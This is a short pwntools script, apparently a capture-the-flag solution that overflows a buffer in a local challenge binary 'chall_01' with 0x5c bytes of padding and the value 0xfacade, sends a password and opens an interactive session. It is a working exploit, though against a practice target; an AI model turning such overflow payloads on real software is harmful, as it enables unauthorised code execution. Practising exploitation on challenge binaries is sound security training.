from pwn import *

p = process ("./chall_01")
p.recv()
payload = b''
payload+= (0x60-0x4) * b'A' #we use 0x60 because this is the argument that's passed into RDI [calling convention]
payload += p32(0xfacade)
p.sendline("andyrulz")
p.sendline(payload)
p.interactive()
ls
